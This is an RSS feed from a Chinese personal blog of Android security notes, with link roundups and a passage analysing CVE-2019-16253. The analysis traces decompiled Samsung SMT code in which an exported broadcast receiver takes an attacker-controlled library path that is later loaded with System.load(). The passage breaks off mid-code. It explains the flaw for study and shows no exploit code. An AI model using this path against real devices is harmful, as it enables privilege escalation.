  &lt;li&gt;https://www.synacktiv.com/ressources/thcon2020_binder.pdf&lt;/li&gt;
  &lt;li&gt;https://www.synacktiv.com/posts/exploit/binder-analysis-and-exploitation-of-cve-2020-0041.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我实在是太菜比了，都不敢跟竞赛队的基友们聊天，菊苣们一个个都double我了，只有我还在应届水平徘徊，拖了菊苣们的后腿，真是愁人&lt;/p&gt;

&lt;p&gt;失守2700，更愁人了&lt;/p&gt;
</description>
                <pubDate>Thu, 19 Mar 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/03/19/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.03.19.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/03/19/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.03.19.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.03.13</title>
                <description>&lt;p&gt;距离上次发安全周报已经过去了整整两个月&lt;/p&gt;

&lt;p&gt;上班肯定还是要上班的，只是多了许多可以自由思考未来的时间，比如如何完善自己的知识体系？今年要学习哪些知识点？提高哪些能力？设置若干挑战？在现有的资源下通过新学习的知识去迭代一个技术等级？或者是通过设立一个技术等级目标来制定学习方向？&lt;/p&gt;

&lt;p&gt;这些都不是说说的，长久以来我都欠缺企业级的开发能力，所以现在有空就会看字节，阿里这些厂商的安卓开发面试题，主要是想看看大厂的技术栈，确实学到了很多有趣的知识&lt;/p&gt;

&lt;p&gt;二进制方面我开始关注逆向的原理，现在的逆向硬刚可不行了，不懂得更深层次的技术，容易抓瞎&lt;/p&gt;

&lt;p&gt;基友们都知道我现在做的是安卓应用安全审计，但是我用过的工具并不多，常见也就是JEB，IDA，接下里要将安卓安全的知识面扩展的全面一些，业界的工具都要用一遍，好的思路借鉴学习，有工具的读源码，没有工具的参考思路实现一波&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/ashishb/android-security-awesome&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;许久之前提过的Jandroid，我借鉴了思路，在业余时间用Java重写了一遍，代码也不多其实，而且添加了很多新思路在里面，因为添加了很多其它功能，所以还没有完全写完，至于什么时候开源就另外再说了&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/FSecureLABS/Jandroid&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;说真的Neo4j盘起来真是优雅&lt;/p&gt;

&lt;p&gt;下一版我会添加更专业一些的静态代码分析模块，去做更精确的漏洞分析辅助功能，一直以来都有相关开源的项目，而且社区很早就开始了相关的研究，比如Soot，Heros，FlowDroid&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/Sable/soot&lt;/li&gt;
  &lt;li&gt;https://github.com/Sable/heros&lt;/li&gt;
  &lt;li&gt;https://github.com/secure-software-engineering/FlowDroid&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Flanker基于FlowDroid进行了二次开发，实现了一些安卓应用的常见漏洞扫描，我个人还是很喜欢这个项目的&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/flankerhqd/JAADAS&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;虽然这些是好多年前的工具，但是其设计思想，背后的原理都很值得我去仔细学习研究，知其然，也知其所以然，方可不断进步&lt;/p&gt;

&lt;p&gt;前几天看泉哥发的一篇文章，讲的是如何读Paper，说来惭愧，我读Paper属于比较笨的那种，我一般只看Abstract，如果发现跟安卓有关以及排版看着很顺眼，我就会直接打印出来，数字这一波免费打印的福利还是可以的，在纸上写写画画确实比在电脑上要有趣的多，就是时间一长容易占地方，泉哥那篇文章里还提到了一篇《How to Read a Paper》，还挺有趣&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://blizzard.cs.uwaterloo.ca/keshav/home/Papers/data/07/paper-reading.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我一直以来都有在安全周报里提我看的一些Paper，有些Paper确实不错，今年除了跟进学习新鲜的Paper之外，还会把往年移动安全相关的Paper翻出来读一读，也是扩展思路，顺便跟大佬们交交朋友&lt;/p&gt;

&lt;p&gt;曾经我由于词汇量不够，读Paper特别慢，我就想了一个方法，用Python解析了Paper里的单词，过滤掉符号等字符，提取出单词，再过滤掉常用的，通过接口去有道做翻译查询，生成一个列表，打印Paper的时候顺手就打印出来，先过一遍单词，然后再看Paper，这样既可以学习单词，读Paper的体验也提升了不少&lt;/p&gt;

&lt;p&gt;最后附一个大佬的博客截图，看的我有点脸红，我实在是太菜了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/2233B675E9F567F47C568D055D54C4C8.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;
</description>
                <pubDate>Fri, 13 Mar 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/03/13/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.03.13.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/03/13/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.03.13.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.01.03</title>
                <description>&lt;p&gt;2020年的第一篇文章&lt;/p&gt;

&lt;p&gt;《浏览器安全周报》 -&amp;gt; 《大土豆安全笔记》&lt;/p&gt;

&lt;p&gt;上周末开始了今年的36C3，我去年才知道这个会议，当时是泉哥在公众号推荐，然后就跟着学习了一波&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://fahrplan.events.ccc.de/congress/2019/Fahrplan/index.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我现在只学习了一个议题《Messenger Hacking - Remotely Compromising an iPhone over iMessage》，来自PJ0的Samuel Groß(@5aelo)，说起来大佬是真的是Nice，上周六早晨我睡的迷迷糊糊，刚拿起手机就看到大佬发推，又是Talk预告，又是slides公开的，看这架势，又是刷屏的节奏了，很厉害！&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://saelo.github.io/presentations/36c3_messenger_hacking.pdf&lt;/li&gt;
  &lt;li&gt;https://media.ccc.de/v/36c3-10497-messenger_hacking_remotely_compromising_an_iphone_through_imessage&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;5aelo说有很多细节忽略了，但是之后会有更详细的文章版本，期待一下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/6FB1BF4932AC14D5697C912833E4A48D.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我已经很久没有做过Android CTF题目了，从题解可以看出来还是比较中规中矩的题目&lt;/p&gt;

&lt;p&gt;CyberTruck Challenge 2019 — Android CTF&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://medium.com/bugbountywriteup/cybertruck-challenge-2019-android-ctf-e39c7f796530&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这段时间我在研究国内的字符串混淆和反混淆相关技术，有师傅给我推荐了烽火实验室开源的一款工具，这里做下记录，我还没有仔细分析细节，等分析完仔细讲讲&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/mikusjelly/dexsim&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;很久之前看到的一个项目，我个人觉得这种项目其实是要好好利用起来的，我仔细的看了里面提到的所有Items，感慨我对于安卓安全领域还是了解的太少，有很多工具我都没听过，惭愧了:((，加入学习的计划里，目前我主要集中在静态分析这一块，我之前的很多想法，其实第一步就是静态分析，构建Graph，这个Graph不仅仅是CFG，总之我想要先把这一块掌握的比较清晰，尤其是接轨目前工业界的水平&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/ashishb/android-security-awesome&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;还是勤劳致富啊&lt;/p&gt;

&lt;hr /&gt;
&lt;p&gt;layout: post
title:  “大土豆安全笔记 2019.12.23 - 2019.12.27”
date:   2019-12-27 18:00:00 +520
categories: Security_Daily
—&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/876A021973D0E00FCCD40780BAD1FB0B.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;作为2020年的头一篇安全笔记，我对去年写的《浏览器安全周报》系列做了总结，去年逼自己学习有点逼的太狠了，看了很多文章，横向知识的扩展还是可以的，但是真正深入学习的却不多，今年开始要对每份资料都学习的更仔细，我要求自己文章里提到的任何一份资料我都仔细学习过，这样的分享才是负责任的&lt;/p&gt;

&lt;p&gt;最后让我们来看个搞笑的：问了下师傅，据说是一个很低级的漏洞，标题写的贼唬人，2333333333333333&lt;/p&gt;

&lt;p&gt;Tencent WeChat name Command Injection Remote Code Execution Vulnerability&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.zerodayinitiative.com/advisories/ZDI-19-1035/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/89737A9F0004866BCF454DCFF77113F2.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但是话又说回来，我们仔细看一下描述：&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;The specific flaw exists within the parsing of a usernames. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of the current process.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;解析用户名的时候，未经校验传入了SystemCall，结合我上面要做的，我们把所有系统调用找到，反推参数传递路径，或许能有些意想不到的收获&lt;/p&gt;
</description>
                <pubDate>Fri, 03 Jan 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/01/03/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.01.03.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/01/03/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.01.03.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.12.23 - 2019.12.27</title>
                <description>&lt;p&gt;上周我发的周报里提到了2019 BotConf里一篇关于Android Application Deobfuscation相关的议题《DeStroid – Fighting String Encryption in Android Malware》，阳仔给我推荐了今年的POC另一个相关的议题《Breaking Android Obfuscation By Applying BAOBAB》，这个议题显然是比前者好的，知其然，也要知其所以然，才能从一个突破点，去尝试突破整个防御面&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/theori-io/POC2019-BAOBAB/blob/master/slides/baobab_final.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;说来有趣，这个议题我到处都没有搜到slides，后来找到了speaker的推特，然后又找到了他的博客&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.bpak.org/blog/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我无意中翻了翻，竟然找到了，运气真好，本来还想着给作者发邮件问问&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/91B9D8229BBF05C175137345EF9B2B0A.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2019 POC官网&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://www.powerofcommunity.net/schedule.htm&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;前两天举办了今年的ChinaSys，主要是交流和探讨计算机系统的最新研究成果，我也是今年才关注到&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/voPOaf9S17bETczpBsCm4w&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;上交的IPADS对本次研讨会做了详细的解读，感觉真好，值得学习，难度比较大，但是我在花时间学习了，毕竟大佬就在身边&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/woFQXyyOth97tnZ0BB5Jfg&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我最近开始回归关注安卓安全领域相关的技术&lt;/p&gt;

&lt;p&gt;这两天连着发了两篇文章：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;《CVE-2019-16253 SamsungSMT导出组件提权漏洞》：拖了很久差点跳票，感谢Flanker_hqd的分享，对于我这种入门级别的选手学习逻辑漏洞是很好的资料，以点概面，期待产出&lt;/li&gt;
  &lt;li&gt;《2019 BotConf - DeStroid – Fighting String Encryption in Android Malware》：之前2019 BotConf上一个反混淆的议题，我说会对其中三个安卓相关的议题做解读，这是第一篇&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;红雨滴团队写的两份报告，感觉最近这个团伙安卓APT报告写的弱了&lt;/p&gt;

&lt;p&gt;《这款流行聊天APP，居然是一个国家的监听工具》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/gJEJHKswzG13jMal5Q0yIA&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《穷源溯流：KONNI APT组织伪装韩国Android聊天应用的攻击活动剖析》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/G1Cebamao-gigq7VsskLnQ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Star写的《为什么ATT&amp;amp;CK对APT关联归属分析用处不大》，我觉得说的在理，前段时间突然到处都是关于ATT&amp;amp;CK的文章，按照国内娱乐圈的套路，直觉告诉我这可能又是一次炒概念，于是我去请教了黄师傅(hyabcd@C0rk1_H)，黄师傅给我详细讲解了一波，我表示学习到了很多！黄师傅就是专业！性感黄师傅，在线抓APT！在不擅长的领域，我选择听大佬的，这玩意就得听搞APT的大佬讲才有收获，Star这篇文章我反复读了很多遍，其中很多知识点我都做了扩展阅读和学习，收获很多&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/Cb7tROj0BXSOxnqyjftlRw&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;还有360的烽火实验室，抓安卓APT也是老司机&lt;/p&gt;

&lt;p&gt;我这个人思路还是不错的，适合搞APT，是APT Defender，不是APT Attacker&lt;/p&gt;

&lt;p&gt;科恩出了个在线APK漏洞扫描工具&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://apkpecker.qq.com/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;实现框架介绍&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://apkpecker.qq.com/file/apkpecker_document.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我感觉最关键的就是这一段了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/F9F4BFF2C452863DFB1E4A3BED20E315.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Maybe：《FlowDroid: Precise Context, Flow, Field, Object-sensitive and Lifecycle-aware Taint Analysis for Android Apps》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.bodden.de/pubs/far+14flowdroid.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我测试了一下，传了个应用上去，需要先排队，然后扫描，速度不是很快，接近三个小时&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/567C20EFCCA1644816EBCEBC4D884F29.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;扫描完之后，报告没有细节&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/6240A03733FC02AF18FE96330D375A1F.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;想看细节需要联系他们，可能是面向商业合作搞的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/6DD283F0E9FC73E12A1D27FF25E53DDB.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;本周的周报好像，一个浏览器的资料都没有，明年要不咱换个标题？&lt;/p&gt;

&lt;p&gt;无意中接触了LeetCode，听说很多人校招会刷这玩意，我看了看竟然还要花钱，想刷算法的同学，可以考虑Codeforces，POJ，HDOJ，这些都是老牌的在线学习站点，题库相当丰富，推荐&lt;/p&gt;
</description>
                <pubDate>Fri, 27 Dec 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/12/27/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.12.23-2019.12.27.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/12/27/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.12.23-2019.12.27.html</guid>
            </item>
        
            <item>
                <title>CVE-2019-16253 SamsungSMT导出组件提权漏洞</title>
                <description>&lt;p&gt;这个漏洞是Flanker_hqd发现的，一个逻辑层的漏洞，却可以进行提权，分析完后觉得其实不困难，自己是可以发现的&lt;/p&gt;

&lt;p&gt;三星有一个叫SamsungSMT这么个应用，具体是干啥的我不是很清楚&lt;/p&gt;

&lt;p&gt;它有一个导出组件&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.samsung.SMT.SamsungTTSService&lt;/code&gt;，其&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onCreate&lt;/code&gt;方法里动态注册了一个BroadcastReceiver，我们知道这默认是导出的&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public void onCreate() {
    ...
    LangPackMgr.get().a(this.getApplicationContext());  // 入口
    ...
    super.onCreate();
}

public void a(Context context) {
    if(this.context == null) {
        ...
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(&quot;com.samsung.SMT.ACTION_INSTALL_FINISHED&quot;);
        this.context.registerReceiver(this.LangPackMgr$2, intentFilter);  // 注册一个广播接收器：&quot;com.samsung.SMT.ACTION_INSTALL_FINISHED&quot;
        ...
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;注册的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LangPackMgr$2&lt;/code&gt;会将传入的Intent内两个数据作为参数构造一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LangPackMgr$UpdateEngineInfo&lt;/code&gt;对象，然后加到一个队列里，经过一系列判断，开始更新&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BroadcastReceiver LangPackMgr$2;

public LangPackMgr() {
    ...
    this.LangPackMgr$2 = new LangPackMgr$2(this);
}

public void onReceive(Context context, Intent intent) {
    int v7 = -1;
    if(intent.getAction().equals(&quot;com.samsung.SMT.ACTION_INSTALL_FINISHED&quot;)) {
        ArrayList arrayList = intent.getCharSequenceArrayListExtra(&quot;BROADCAST_CURRENT_LANGUAGE_INFO&quot;);
        Class_l v1 = new Class_l(arrayList.toArray(new String[arrayList.size()]));
        v1.a(intent.getStringExtra(&quot;BROADCAST_CURRENT_LANGUAGE_VERSION&quot;));
        v1.setArrayList(intent.getCharSequenceArrayListExtra(&quot;BROADCAST_DB_FILELIST&quot;));
        v1.a(true);
        int Extra_SMT_ENGINE_VERSION = intent.getIntExtra(&quot;SMT_ENGINE_VERSION&quot;, v7);
        String Extra_SMT_ENGINE_PATH = intent.getStringExtra(&quot;SMT_ENGINE_PATH&quot;);
        if(Extra_SMT_ENGINE_VERSION &amp;gt; SmtTTS.get().getEngineVersion() &amp;amp;&amp;amp; (r.isFileExist(Extra_SMT_ENGINE_PATH))) {
            if(j.a(Extra_SMT_ENGINE_PATH)) {
                LangPackMgr.getUpdateEngineQueue(this.a).add(new LangPackMgr$UpdateEngineInfo(Extra_SMT_ENGINE_VERSION, Extra_SMT_ENGINE_PATH));
                LOG.b(q.b, &quot;LangPackMgr - Add candidate engine [%d][%s]&quot;, new Object[]{Integer.valueOf(Extra_SMT_ENGINE_VERSION), Extra_SMT_ENGINE_PATH});
            }
        ...
        LangPackMgr.doUpdateEngine(this.a);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用多线程来执行，在线程里我们看到一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reloadEngine()&lt;/code&gt;方法&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static void doUpdateEngine(LangPackMgr langPackMgr) {
    langPackMgr.updateEngine();
}

private void updateEngine() {
    if(this.mThreadUpdateEngine == null || !this.mThreadUpdateEngine.isAlive()) {
        this.mThreadUpdateEngine = new LangPackMgr$EngineUpdateThread(this, null);
        this.mThreadUpdateEngine.start();
    }
}

public void run() {
    ...
        if(v1 != null &amp;amp;&amp;amp; ((LangPackMgr$UpdateEngineInfo)v1).SMT_ENGINE_VERSION &amp;gt; SmtTTS.get().getEngineVersion()) {
            l.a().b(((LangPackMgr$UpdateEngineInfo)v1).SMT_ENGINE_PATH);
            if(SmtTTS.get().reloadEngine()) {   &amp;lt;== 注意看这里
                LOG.c(&quot;Restart engine...&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;跟入可以看到直接使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;System.load()&lt;/code&gt;加载了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v0_2&lt;/code&gt;指向的路径，那么&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;l.a().k()&lt;/code&gt;返回的是什么呢？&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public boolean reloadEngine() {
    boolean v0_3;
    boolean v3;
    this.e();
    try {
        String v0_2 = l.a().k();
        if(r.isFileExist(v0_2)) {
            System.load(v0_2);
        }
        else {
            goto label_71;
        }
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reloadEngine()&lt;/code&gt;上两句代码，这里说的是如果版本号高于本地数据，就进入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if&lt;/code&gt;逻辑处理，可以看到，最后将Intent内&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;SMT_ENGINE_PATH&quot;&lt;/code&gt;的数据写到本地SP文件的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;SMT_INSTALLED_ENGINE_PATH&quot;&lt;/code&gt;字段&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(v1 != null &amp;amp;&amp;amp; ((LangPackMgr$UpdateEngineInfo)v1).SMT_ENGINE_VERSION &amp;gt; SmtTTS.get().getEngineVersion()) {
    l.a().b(((LangPackMgr$UpdateEngineInfo)v1).SMT_ENGINE_PATH);    &amp;lt;== 1
    
public void b(String param_SMT_ENGINE_PATH) {
    if(param_SMT_ENGINE_PATH != null) {
        l.SMT_LATEST_INSTALLED_ENGINE_PATH = param_SMT_ENGINE_PATH;
        this.a(&quot;SMT_LATEST_INSTALLED_ENGINE_PATH&quot;, param_SMT_ENGINE_PATH);  &amp;lt;== 2
    }
    else {
        LOG.d(&quot;Try to set SMT_INSTALLED_ENGINE_PATH with null&quot;);
    }
}

public void a(String SMT_INSTALLED_ENGINE_PATH, String param_SMT_ENGINE_PATH) {
    this.a(n.a, SMT_INSTALLED_ENGINE_PATH, param_SMT_ENGINE_PATH);  &amp;lt;== 3
}

public void a(n arg2, String SMT_INSTALLED_ENGINE_PATH, String param_SMT_ENGINE_PATH) {
    SharedPreferences sp = this.c(arg2);
    if(sp != null) {
        SharedPreferences$Editor sp$editor = sp.edit();
        sp$editor.putString(SMT_INSTALLED_ENGINE_PATH, param_SMT_ENGINE_PATH);  &amp;lt;== 4
        sp$editor.commit();
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;再来看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;l.a().k()&lt;/code&gt;，可以看到返回值就是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;SMT_ENGINE_PATH&quot;&lt;/code&gt;指向的数据，这个数据我们可控，修改Intent即可&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public String k() {
    if(r.isFileExist(l.SMT_LATEST_INSTALLED_ENGINE_PATH)) {
        try {
            if(j.a(l.SMT_LATEST_INSTALLED_ENGINE_PATH)) {
                String v0_1 = l.SMT_LATEST_INSTALLED_ENGINE_PATH;
                return v0_1;
            }

            LOG.a(&quot;Invalid INSTALLED_ENGINE_PATH = &quot; + l.SMT_LATEST_INSTALLED_ENGINE_PATH);
        }
        catch(Exception v0) {
            v0.printStackTrace();
        }
    }

    this.j();
    return null;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这时我们来看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.samsung.SMT.SamsungTTSService&lt;/code&gt;注册的另一个BroadcastReceiver&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public void onCreate() {
    ...
    LangPackMgr.get().a(this.getApplicationContext());  // 入口
    ...
    super.onCreate();
}

public void a(Context arg4) {
    if(this.context == null) {
        ...
        IntentFilter v0_1 = new IntentFilter(&quot;android.intent.action.PACKAGE_ADDED&quot;);
        v0_1.addAction(&quot;android.intent.action.PACKAGE_REMOVED&quot;);
        v0_1.addAction(&quot;android.intent.action.PACKAGE_CHANGED&quot;);
        v0_1.addDataScheme(&quot;package&quot;);
        this.context.registerReceiver(this.LangPackMgr$1, v0_1);  // 注册一个广播接收器，用于判断应用安装，删除相关Action
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;广播接收器&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LangPackMgr$1&lt;/code&gt;会判断新安装应用的包名是否是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;com.samsung.SMT.lang&quot;&lt;/code&gt;开头，如果是，就调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a.d()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BroadcastReceiver LangPackMgr$1;
    

public LangPackMgr() {
    this.LangPackMgr$1 = new LangPackMgr.1(this);
}

class LangPackMgr.1 extends BroadcastReceiver {
    LangPackMgr.1(LangPackMgr arg1) {
        this.a = arg1;
        super();
    }

    @Override  // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        String v1 = intent.getData().getSchemeSpecificPart();
        if(((action.equals(&quot;android.intent.action.PACKAGE_ADDED&quot;)) 
                    || (action.equals(&quot;android.intent.action.PACKAGE_CHANGED&quot;)) 
                    || (action.equals(&quot;android.intent.action.PACKAGE_REMOVED&quot;))) 
                &amp;amp;&amp;amp; v1 != null 
                &amp;amp;&amp;amp; (v1.startsWith(&quot;com.samsung.SMT.lang&quot;))) {
            this.a.d();
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;经过若干次的调用&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public void d() {
    this.a(null);
}

public void a(j arg2) {
    if(this.context != null) {
        if(arg2 != null) {
            this.i = arg2;
        }

        this.e();  // 传入的参数是null，所以直接调用函数e
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;启动一个线程&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;private void e() {
    if(this.g == null || !this.g.isAlive()) {
        this.g = new i(this, null);
        this.g.start();
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;对应的实现，通过搜索安装的应用来过滤出指定前缀的包名，然后启动Service&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class Thread_i extends Thread {
    private Thread_i(LangPackMgr langPackMgr) {
        this.a = langPackMgr;
        super();
    }

    @Override
    public void run() {
